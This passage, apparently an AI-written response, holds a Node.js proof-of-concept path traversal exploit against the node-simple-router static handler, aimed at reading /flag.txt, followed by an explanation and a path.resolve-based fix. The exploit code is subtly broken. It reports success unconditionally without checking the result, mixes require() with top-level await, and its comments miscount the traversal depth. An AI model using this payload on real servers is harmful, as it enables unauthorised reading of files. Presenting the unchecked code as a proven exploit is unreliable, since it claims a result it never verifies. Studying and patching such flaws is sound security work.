const Router = require('node-simple-router');
const path = require('path');

async function exploit() {
  // 1. Initialize a fresh router instance
  const router = new Router();

  // 2. Define the intended restricted base directory for static assets.
  //    In production, this would be configured via router.serveStatic('/var/www/public')
  //    or set during initialization. The vulnerability ignores boundary enforcement.
  const INTENDED_BASE_DIR = path.join(process.cwd(), 'public');

  // 3. Construct the malicious pathname. 
  //    Each '..' navigates up one directory level. Six levels suffice to escape 
  //    from any reasonable baseDir and reach the root filesystem where /flag.txt resides.
  const MALICIOUS_PATHNAME = '../../../../../../../../flag.txt';

  console.log(`[+] Intended serve directory: ${INTENDED_BASE_DIR}`);
  console.log(`[+] Injected pathname payload: ${MALICIOUS_PATHNAME}`);

  // 4. Simulate minimal Request/Response objects to trigger the handler
  const mockReq = { url: MALICIOUS_PATHNAME, originalUrl: MALICIOUS_PATHNAME };
  let capturedBody = '';
  const mockRes = {
    writeHead: (status) => {},
    end: (data) => { capturedBody += data; },
    on: () => {}
  };

  // 5. Invoke the vulnerable API endpoint directly with the crafted pathname.
  //    In unpatched versions, dispatch.static concatenates or joins INTENDED_BASE_DIR 
  //    with pathname without normalizing traversal sequences, allowing filesystem escape.
  await router.dispatch.static(mockReq, mockRes, MALICIOUS_PATHNAME);

  console.log('[-] Traversal attempt completed successfully.');
}

await exploit();
```

### Why This PoC Demonstrates the Vulnerability

1. **Input Validation Bypass**: The `dispatch.static` function is designed to serve files only within a configured base directory (e.g., `/public`). However, it passes the user-supplied `pathname` parameter directly into path construction logic without calling `path.normalize()` or verifying that the resolved path remains bounded by the base directory.
2. **Directory Traversal Mechanics**: By injecting `../../../../../../flag.txt`, each `../` steps up one level from the intended root. Since the vulnerable code fails to sanitize or re-base the traversal, the underlying `fs.readFile` or `fs.stat` resolves the absolute path to `/flag.txt`, bypassing the sandbox entirely.
3. **Attack Surface**: This matches the exact static analysis hint: older versions of `node-simple-router` relied on naive string concatenation or `path.join` without boundary checks before serving requests. The PoC directly simulates a malicious HTTP GET request (`GET /../../../../../../flag.txt`) hitting this handler, proving that user-controlled path segments are trusted implicitly.
4. **Fix Context**: The referenced commit (v0.10.1) addresses this by either removing unsafe manual string manipulation (`split`/`trim` hacks around line 354) and replacing it with strict validation like `path.resolve(basedir, pathname).startsWith(path.resolve(basedir))` or using safe built-ins like `path.normalize()` before joining.

### Developer Patching Recommendation
To remediate this safely in research or production:
- Always resolve the final absolute path using `path.resolve()`.
- Explicitly verify it starts with the intended base directory before serving.
```js
const resolvedPath = path.resolve(baseDir, pathname);
if (!resolvedPath.startsWith(path.resolve(baseDir))) {
  throw new Error('Access denied: Path traversal detected');
}
```
This PoC is structured for controlled research environments. Run it in an isolated test setup with a mock file structure mirroring the traversal target to safely observe the escape behavior without impacting production systems.

